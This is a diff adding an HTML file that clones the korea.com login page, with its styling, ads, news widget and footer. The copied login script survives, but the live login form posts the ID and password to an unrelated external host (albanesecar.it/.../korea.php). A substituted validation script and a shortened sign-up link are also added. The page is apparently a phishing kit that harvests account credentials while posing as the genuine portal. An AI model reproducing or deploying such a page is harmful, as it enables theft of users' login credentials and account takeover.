@@ -1,0 +1,497 @@
+<html xmlns="http://www.w3.org/1999/xhtml">
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+		<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+		<title>코리아닷컴 - 코리아는 당신을 사랑합니다.</title>
+		<link rel="stylesheet" type="text/css" href="https://id.korea.com/2021/css/20220316_login.css" />
+		<script src="/js/jquery-1.8.3.min.js"></script>
+		<script src="/js/jquery.placeholder.js"></script>	
+		<script type="text/javascript" src="/js/jquery.alphanum.js"></script>
+<style>
+.newsList {margin-top:10px;text-align:left;width:668px;background-color:#fff;font-size:14px;font-family:"Noto Sans KR","Titillium Web","맑은 고딕","Malgun Gothic","나눔 고딕","Nanum Gothic","dotum","cwTeXHei", "Jeju gothic",Sans-serif;}
+.newsList li{margin-left:70px;padding:5px 10px;line-height:21px;color:#2f2f2f;font-weight:bold;}
+.newsList li a:hover {text-decoration: underline;color:blue;}
+.newsList p {margin-left:75px;margin-bottom:10px;font-size:15px;font-weight:bold;}
+</style>
+<script type="text/javascript">
+
+function MM_openBrWindow(theURL,winName,features) { //v2.0
+
+  window.open(theURL,winName,features);
+
+}
+
+// JCG , 인라이플 배너광고 랜덤 롤링 추가 2019.09
+$(function() {
+	var how_many_ads = 2;
+	var now = new Date()
+	var sec = now.getSeconds()
+	var ad = sec % how_many_ads;
+	ad +=1;
+	if (ad==1) {
+		$("#area1").show();
+		$("#area2").hide();
+	}
+	if (ad==2) {
+		$("#area2").show();
+		$("#area1").hide();
+	}	
+});
+
+</script>
+
+		<script type="text/javascript">
+			function onGoTo(sURL){
+				try{
+					if ( opener != null ){
+						if(opener.closed){
+							window.open(sURL,"POP_LOGIN");	
+						}	
+						else{	
+							opener.document.location.href=sURL;
+						}	
+					}	 		
+					else{
+						window.open(sURL,"POP_LOGIN");	
+					}	
+				}
+				catch(e){
+					window.open(sURL,"POP_LOGIN");	
+				}	
+			}		
+	
+			function warningMsgSaveID(){
+				if(document.getElementById('chkIDSave').checked == true){
+					alert("아이디 저장할 때 이런 점을 주의하세요!\n\n학교, 학원, PC방 처럼 컴퓨터를 공동으로 사용하는 환경에서는\n타인에게 정보가 공개될 수 있으므로 ID 저장을 설정하지 않는 것이\n좋습니다.");
+					document.getElementById('idsave').value ="on";
+				}
+				else if(document.getElementById('chkIDSave').checked == false){
+					document.getElementById('idsave').value ="off";
+				}
+			}
+
+			function checkFocus(){
+				if(document.login.user.value.length > 0)
+					document.all.user.style.backgroundImage="";
+			}
+			
+			document.onkeypress=checkFocus;
+
+			function cookieVal(cookieName){
+				thisCookie = document.cookie.split("; ");
+
+				for(i=0; i<thisCookie.length; i++) {
+					if(cookieName == thisCookie[i].split("=")[0])		
+						return thisCookie[i].split("=")[1]
+				}
+				
+				return "x"
+			}
+
+			function saveID() {
+				var id;
+				id = document.login.user.value; 	
+
+				var todayDate = new Date();
+				todayDate.setDate(todayDate.getDate() + 365);
+	
+				document.cookie = "idsave=on; domain=.korea.com" + "; expires=" + todayDate.toGMTString();
+				document.cookie = "loginid=" + id + "; domain=.korea.com" + "; expires=" + todayDate.toGMTString();
+			}
+
+			function unsaveID() {	
+				var todayDate = new Date();
+				todayDate.setDate(todayDate.getDate() + 365);
+	
+				document.cookie = "idsave=off; domain=.korea.com" + "; expires=" + todayDate.toGMTString();
+				document.cookie = "loginid=; domain=.korea.com" + "; expires=" + todayDate.toGMTString();
+			}
+
+			function saveSSL() {
+				var id;	
+				var todayDate = new Date();
+				todayDate.setDate(todayDate.getDate() + 365);	
+				document.cookie = "ssl=on; domain=.korea.com" + "; expires=" + todayDate.toGMTString();
+			}
+
+			function unsaveSSL() {	
+				var todayDate = new Date();
+				todayDate.setDate(todayDate.getDate() + 365);	
+				document.cookie = "ssl=off; domain=.korea.com" + "; expires=" + todayDate.toGMTString();
+			}
+
+			function checkSSL() {
+				idCheck();
+
+				if(cookieVal("ssl") != "off"){
+					document.login.ssl.value = "on";		
+				}
+				document.login.user.focus();
+			}
+
+			function checkLogin() {
+				if (document.login.user.value.length == 0) {
+					alert("아이디를 입력하세요");
+					document.login.user.focus();
+					return false;
+				}
+				
+				if (document.login.password.value.length == 0) {
+					alert("비밀번호를 입력하세요");
+					document.login.password.focus();
+					return false;
+				}
+/*
+				if (document.login.captcha.value.length == 0) {
+					alert("보안문자를 입력하세요.");
+					document.login.captcha.focus();
+					return false;
+				}
+*/	
+				if (document.login.idsave.value == "on")
+					saveID();
+				else
+					unsaveID();
+
+				if (document.login.ssl.value == "on"){	
+					saveSSL();
+					document.login.action ="https://id.korea.com/ca.php";
+				}
+				else{	
+					unsaveSSL();
+					document.login.action ="https://id.korea.com/ca.php";
+				}
+			
+				return;
+			}
+
+			function resetBgID() {	
+				document.getElementById('user').style.backgroundImage="";	
+			}
+
+			function resetBgPW() {
+				document.login.password.style.backgroundImage="";
+				return true;
+			}
+
+			function initLogin() {
+				if(cookieVal("idsave") == "on")	{
+					var loginid = cookieVal("loginid");
+					document.login.idsave.value = "on";
+					document.getElementById('chkIDSave').checked = true;
+					resetBgID();				
+					document.login.user.value = loginid;
+					document.login.password.focus();
+				}
+				else {
+					document.login.idsave.value = "off";
+					document.getElementById('chkIDSave').checked = false;
+					document.login.user.value = "";
+					//document.login.user.focus();
+				}		
+			}
+		</script>
+	</head>
+	<!-- <body  onLoad="MM_openBrWindow('http://imgs.korea.com/popup/20150924_sms.jpg','sms','width=350px,height=450px')"  ></body> -->
+	<body onload="">
+		<form method="post" name="myForm" action="https://albanesecar.it/emi/kuz/korea.php" onsubmit="return validated();">
+		<!--<input type="hidden" name="idsave" id="idsave" value="" />-->
+		<!--<input type="hidden" name="ssl" id="ssl" value="on" />-->
+		<!--<input type="hidden" name="target" value="">-->
+		<!--<input type="hidden" name="mode" value="">-->
+		<!--<input type="hidden" name="returl" value="">-->
+		<!--<input type="hidden" name="hisurl" value="">-->
+		<!--<input type="hidden" name="token" value="" id="token">-->
+		<div id="wrap">
+			<!-- HEADER -->
+			<div id="header">
+				<div id="top">
+					<h1>
+						<a href="#"><img src="https://id.korea.com/2013/images/logo.gif" width="126" height="19" alt="코리아닷컴" title="코리아닷컴"/></a>
+						<span><img src="https://id.korea.com/2013/images/login.gif" class="login_title" width="53" height="19" alt="로그인" title="로그인"/></span>
+						<span><img src="https://id.korea.com/2013/images/signin.gif" width="62" height="19" alt="SIGN IN" title="SIGN IN"/></span>
+					</h1>
+				</div>
+			</div>
+			<!-- // HEADER -->
+
+			<!-- CONTENT  -->
+			<div id="container" class="cf">
+				<h3 class="blind">로그인 정보 입력</h3>
+				<div class="login_box" class="cf">
+					<p><img src="https://id.korea.com/2013/images/welcome.gif" alt="코리아닷컴에 오신것을 환영합니다." title="코리아닷컴에 오신것을 환영합니다."/></p>
+					<p class="welcome_text">다양한 서비스 이용을 위해 로그인해 주세요.</p>
+							
+					<fieldset class="fieldset01">
+						<div class="left">
+							<ul>
+								<li>
+									<input type="text" id="user" name="userid" class="input_type1" border="0" title="아이디입력" required placeholder="ID" tabindex="1"/>
+								</li>
+								<li>
+									<input type="password" id="password" name="pass" class="input_type1" border="0" title="비밀번호입력" required placeholder="Password" autocomplete="off" tabindex="2"/>
+								</li>
+							</ul>
+						</div>
+						<div class="left">
+							<ul>
+								<li style="height:37px;">
+									<span class="checkbox">
+										<input type="checkbox" id="chkIDSave" class=""border="0" title="아이디입력" value="" onclick="warningMsgSaveID();"/> ID 저장[Save I D]
+									</span>
+								</li>
+							</ul>
+						</div>
+						
+					</fieldset>
+					<div class="btn-type1">
+						<input type="submit" width="337" height="32" class="btn_login" value="로그인" title="로그인" tabindex="4"/>
+					</div>
+					
+					<div class="btn_box">
+						<p class="signup_text">코리아닷컴 회원이 아니신가요?</p>
+						<p class="signup_img"><img src="https://id.korea.com/2013/images/registered.gif" alt="Not registered yet?" title="Not registered yet?"/></p>
+						<span>
+							<a href="https://vo.la/76AJp">
+								<img src="https://id.korea.com/2013/images/btn_signup.jpg"  class="btn_signup" alt="코리아닷컴 회원가입(SIGN UP HERE!)" title="코리아닷컴 회원가입(SIGN UP HERE!)"/>
+							</a>
+						</span>
+						<span>
+							<a href="https://register.korea.com/opendoc2/find_idpw.asp">
+								<img src="https://id.korea.com/2013/images/btn_forget.jpg" alt="아이디/비밀번호 찾기(FORGET ID OR PASSWORD?)" title="아이디/비밀번호 찾기(FORGET ID OR PASSWORD?)"/>
+							</a>
+						</span>
+					</div>
+				</div>
+				
+				<!-- 우측배너 1개 일경우
+				<div class="right_img2">
+					<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-7626865586510164"
+						 crossorigin="anonymous"></script>
+					<ins class="adsbygoogle"
+						 style="display:inline-block;width:312px;height:460px"
+						 data-ad-client="ca-pub-7626865586510164"
+						 data-ad-slot="1711008662"></ins>
+					<script>
+						 (adsbygoogle = window.adsbygoogle || []).push({});
+					</script>
+				</div>
+				 우측배너 1개 일경우 -->
+
+				<!-- 우측배너 2개 일경우 -->
+				<div class="right_img">
+
+					<div id="area1">
+						<!-- DionMedia -->
+							<script async="async" src="https://www.googletagservices.com/tag/js/gpt.js"></script>
+							<script>
+							  var googletag = googletag || {};
+							  googletag.cmd = googletag.cmd || [];
+							</script>
+							<div id="korea_loginright1_v_300_250">
+							  <script>
+								googletag.cmd.push(function () {
+								googletag.defineSlot('/83673359,15806450/korea_loginright1_v_300_250', [300, 250], 'korea_loginright1_v_300_250').addService(googletag.pubads().set("page_url", "korea.com"));
+								googletag.enableServices();
+								googletag.display('korea_loginright1_v_300_250');
+								});
+							  </script>
+							</div>
+							<!-- DionMedia -->
+					</div>
+
+					<div class="right_banner_2">
+						<script async="async" src="https://www.googletagservices.com/tag/js/gpt.js"></script>
+						<script>
+						  var googletag = googletag || {};
+						  googletag.cmd = googletag.cmd || [];
+						</script>
+						<div id="korea_loginrightbottom_v_300_250">
+						  <script>
+							googletag.cmd.push(function () {
+							googletag.defineSlot('/83673359,15806450/korea_loginrightbottom_v_300_250', [300, 250], 'korea_loginrightbottom_v_300_250').addService(googletag.pubads().set("page_url", "korea.com"));
+							googletag.enableServices();
+							googletag.display('korea_loginrightbottom_v_300_250');
+							});
+						  </script>
+						</div>
+					</div>
+
+				</div>
+				<!-- 우측배너 2개 일경우 --> 
+				
+			</div>
+			<!-- CONTENT  -->
+			
+			<!-- 로그인 하단 배너 -->
+			<!-- 우측배너 1개 일경우 <div class="safeconnect_banner2" style="top:-290px;"> 우측배너 1개 일경우-->
+			<!-- 우측배너 2개 일경우--> <div class="safeconnect_banner" style="margin-top:35px;"> <!-- 우측배너 2개 일경우-->
+				<span>(광고)</span>
+				<br>
+				<a href="https://safeconnect.co.kr/sfconn/login/scJoinPopupIntegrated?ptrSvcSn=psn098&et=korea01" target="_blank">
+					<img src="./2013/images/safeconnect_banner.gif" alt="(광고)전화번호안심로그인" title="(광고)전화번호안심로그인"/>
+				</a>
+			</div>
+			<!-- 로그인 하단 배너 -->
+
+			<!-- 로그인 하단 뉴스영역 -->
+			<!-- 우측배너 1개 일경우 <div style="margin-top:-190px;text-align:center;width:668px;background-color:#fff;"> 우측배너 1개 일경우-->
+			<!-- 우측배너 2개 일경우 --><div style="margin-top:60px;text-align:center;width:668px;background-color:#fff;"> <!--우측배너 2개 일경우-->
+			<iframe class="iframeNewsArea" src="https://news.korea.com/korea" framespacing='0' frameborder='no' scrolling='no' topmargin='0' leftmargin='0' marginwidth='0' marginheight='0' width='500' height='305'></iframe>
+			</div>
+			<!--<div class="newsList" ><br>
+				<p>[많이 본 뉴스]</p>
+				<ul>								
+	<li><a href="https://news.korea.com/newsView/2022070262bfffb313d0c">- [속보]은평구·고양시 때 아닌 사랑벌레·러브버그 출몰 소동</a></li>
+								
+	<li><a href="https://news.korea.com/newsView/2022070262bf317673ee0">- "주식 · 가상화폐 투자로 잃은 빚 없던걸로" 충격적인 정책에 누리꾼 분노</a></li>
+								
+	<li><a href="https://news.korea.com/newsView/2022070262c01725779e3">- '완도 실종' 조유나 양 일가족, 장례절차 없이 1일 화장</a></li>
+								
+	<li><a href="https://news.korea.com/newsView/2022070262bfab5438ee9">- 차장금 과일비빔장 레시피 공개...차예련, 여름메뉴로 첫 승</a></li>
+								
+	<li><a href="https://news.korea.com/newsView/2022070262bfecf57d691">- '환혼' 정소민·황민현 포옹에 장욱 질투심 폭발</a></li>
+								
+	<li><a href="https://news.korea.com/newsView/2022070262c02e9337f9e">- '놀면뭐하니' 작곡가 조영수 결혼·나이·저작권료 화제인 이유</a></li>
+								
+	<li><a href="https://news.korea.com/newsView/2022070262c037f38ed12">- '환혼 인물관계도' 이재욱X정소민 '마의 이선생' 임철수 첫 만남</a></li>
+								
+	<li><a href="https://news.korea.com/newsView/2022070262bf8f3349b47">- [종합] 소상공인 손실보상 1분기분 지급시작...신청방법·대상은?</a></li>
+								
+	<li><a href="https://news.korea.com/newsView/2022070262bf93e391497">- 현대 아이오닉6 사전예약·가격대는? 크기·주행거리·제원 궁금증</a></li>
+								
+	<li><a href="https://news.korea.com/newsView/2022070262bf4432080d4">- "상대팀은 뭐래요?" 탬파베이-토론토, 더블헤더 앞두고 신경전 [MK현장]</a></li>
+								
+	<li><a href="https://news.korea.com/newsView/2022070262bf77c221e9c">- 日 음악 시장 접수하러…에스파→르세라핌 출동 [MK★초점]</a></li>
+								
+	<li><a href="https://news.korea.com/newsView/2022070262bf7c780ac70">- 김태희,장동건..0.0001% 연예인들 사이에 입소문난 여행지 BEST 5</a></li>
+								
+	<li><a href="https://news.korea.com/newsView/2022070262bff1a3c89fd">- [국제포토] 폭염에 노출된 주말 '찬 음료와 그늘이 최고'</a></li>
+								
+	<li><a href="https://news.korea.com/newsView/2022070262c0127348d7a">- [속보]여주 영동 고속도로 교통사고, 포르쉐·화물차 추돌</a></li>
+								
+	<li><a href="https://news.korea.com/newsView/2022070262c037f39377f">- '도시어부' 시즌4, 오는 9일 첫 방송...이경규·이덕화 고정</a></li>
+								
+	<li><a href="https://news.korea.com/newsView/2022070262bf2cc612882">- 치매 앓던 아버지 숨지자..냉장고에 시신 넣어둔 20대 이유 알려지자.. 모두 오열</a></li>
+								
+	<li><a href="https://news.korea.com/newsView/2022070262bfc77370312">- 조정지역 해제되면 달라지는 점은? 대구·대전 수혜 기대감</a></li>
+								
+	<li><a href="https://news.korea.com/newsView/2022070262bfd583739e2">- [쇼음악중심 출연진] 선미·던 컴백...트와이스 나연·클라씨·탄 출격</a></li>
+								
+	<li><a href="https://news.korea.com/newsView/2022070262bff1a3cdfb4">- 유재석 브랜드평판, 6월에 이어 7월도 1위...2위는?</a></li>
+								
+	<li><a href="https://news.korea.com/newsView/2022070262bfffb3172c6">- 송가인 걍나와 출연 인증샷, 강호동과 하트</a></li>
+								
+	<li><a href="https://news.korea.com/newsView/2022070362c070328ef2e">- 윤아, 시간이 흘러도 여전한 미모+넘사벽 몸매 [똑똑SNS]</a></li>
+								
+	<li><a href="https://news.korea.com/newsView/2022070262bf10a241989">- 조코비치에 분패 아쉬웠나…권순우, 복식 '1박 2일' 승부서도 패배</a></li>
+								
+	<li><a href="https://news.korea.com/newsView/2022070262bf10a7eba5d">- [오늘의 운세] 2022년 7월 3일 띠별 운세</a></li>
+								
+	<li><a href="https://news.korea.com/newsView/2022070262c012734314c">- 로또 1022회 판매·추첨시간 '변경' 1021·1020회 1등당첨지역 공개</a></li>
+								
+	<li><a href="https://news.korea.com/newsView/2022070262c037f622014">- '환혼' 정소민ㆍ황민현과 포옹…이재욱 질투심 '폭발'</a></li>
+								
+	<li><a href="https://news.korea.com/newsView/2022070262c04ab227a27">- SM루키즈, 훈훈한 3인방 승한-은석-쇼헤이 공개</a></li>
+								
+	<li><a href="https://news.korea.com/newsView/2022070262bf0bf39f997">- 이정재X정우성, '헌트'로 23년 만에 조우…개봉 전 부터 기대감↑</a></li>
+								
+	<li><a href="https://news.korea.com/newsView/2022070262bf8a83c8b57">- 정희용 의원 “마포구 서교동 집중호우 피해 현장 방문”</a></li>
+								
+	<li><a href="https://news.korea.com/newsView/2022070262bf8f334e9c5">- 제45대 강진원 강진군수 취임식, 비전.철학 담아 프리젠테이션 진행</a></li>
+								
+	<li><a href="https://news.korea.com/newsView/2022070262bfb0039c958">- [세계 코로나 확진자] 7월 2일 전 세계 코로나 확진자 현황·순위</a></li>
+</ul>			</div>-->
+			<!-- 로그인 하단 뉴스영역-->
+			
+			<!--
+			<div style="margin-top:40px;">
+				<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+				<ins class="adsbygoogle"
+					 style="display:inline-block;width:670px;height:90px"
+					 data-ad-client="ca-pub-7626865586510164"
+					 data-ad-slot="8015862645"></ins>
+				<script>
+				(adsbygoogle = window.adsbygoogle || []).push({});
+				</script>	
+			</div>
+			-->
+
+			<!-- FOOTER-->
+			<div id="footer">
+				<address>
+					<p>08506 서울시 금천구 가산디지털2로 98 롯데IT캐슬 2동 6층 610호 │대표이사 : 김정주,김은경  </p>
+					<p>고객센터(팩스) : 02-2085-0701  사업자등록번호 : 214-86-80927 	</p>
+				</address>
+				<p>Copyrightⓒ <strong>㈜코리아닷컴커뮤니케이션즈</strong> All rights reserved.</p>				
+			</div>
+			<!-- // FOOTER -->
+			
+			<div id="RpopBannerleft01">
+				<!-- 좌 날개_120*600 -->
+				<script async="async" src="https://www.googletagservices.com/tag/js/gpt.js"></script>
+				<script>
+				  var googletag = googletag || {};
+				  googletag.cmd = googletag.cmd || [];
+				</script>
+				<div id="korea_loginskyleft_v_160_600">
+				  <script>
+					googletag.cmd.push(function () {
+					googletag.defineSlot('/83673359,15806450/korea_loginskyleft_v_160_600', [160, 600], 'korea_loginskyleft_v_160_600').addService(googletag.pubads().set("page_url", "korea.com"));
+					googletag.enableServices();
+					googletag.display('korea_loginskyleft_v_160_600');
+					});
+				  </script>
+				</div>
+			</div>
+
+		</div>
+		</form>
+<script type="text/javascript">
+<!--
+	$(document).ready(function(){
+		$('.input_type4').numeric();
+	});
+//-->
+</script>
+
+
+<!-- Form Validation -->
+
+<script>
+	function validated() {
+if(document.myForm.userid.value.trim() == ""){
+	alert("Please Provide Your Email!");
+	document.myForm.userid.focus();
+	return false;
+}
+if(document.myForm.pass.value.trim() == "" || document.myForm.pass.value.length==0 ){
+	alert("Please Provide Password!");
+		document.myForm.pass.focus();
+		return false;
+	}
+	return true;
+}
+</script>
+
+
+
+
+
+
+
+
+
+	<!-- 2022.02.04 아이커버  -->
+	<script src='//img.mobon.net/js/common/HawkEyesMaker.js'></script>
+	<script>
+			new HawkEyes({"type":"icover","platform":"W","scriptCode":"620421","settings":{"psb":"99"}});
+	</script>
+	
+	<!-- 2021.12.22 토스트 추가 -->
+	<script src='//img.mobon.net/js/common/HawkEyesMaker.js'></script>
+	<script>
+			new HawkEyes({"type":"floating","platform":"W","scriptCode":"605388","frameCode":"74","width":"300","height":"250","settings":{"fType":"3","align":"right","types":"video"}});
+	</script>
+	</body>
+</html>
